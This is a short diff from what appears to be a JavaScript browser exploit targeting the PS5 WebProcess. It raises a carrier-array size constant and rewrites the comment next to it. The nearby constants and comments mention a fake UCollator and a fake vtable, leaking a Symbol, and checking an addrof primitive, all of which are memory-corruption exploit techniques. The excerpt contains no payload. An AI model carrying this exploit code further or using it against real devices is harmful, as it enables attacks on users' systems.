@@ -261,10 +261,10 @@ const ARENA_BYTES = 0x1000;
 const FAKE_UCOLLATOR_OFFSET = 0x100;
 const FAKE_VTABLE_OFFSET = 0x300;
 
-// Same issue as the main core: the hard-coded carrier is too large for a
-// stable PS5 WebProcess allocation profile. Keep it bounded to avoid the
-// sysmem exhaustion that appears before the exploit has even validated the leak.
-const CARRIER_SLOTS = 2000000;
+// This must match the same carrier geometry as the core exploit; otherwise the
+// leaked Symbol copy no longer stays within the backing store and the primitive
+// fails the addrof validation phase.
+const CARRIER_SLOTS = 9000000;
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
 const CAPTURE_DELAY_MS = intParam("cap", 50, 0, 60000);
 const COMPOSE_DELAY_MS = CAPTURE_DELAY_MS + intParam("gap", 50, 0, 60000);
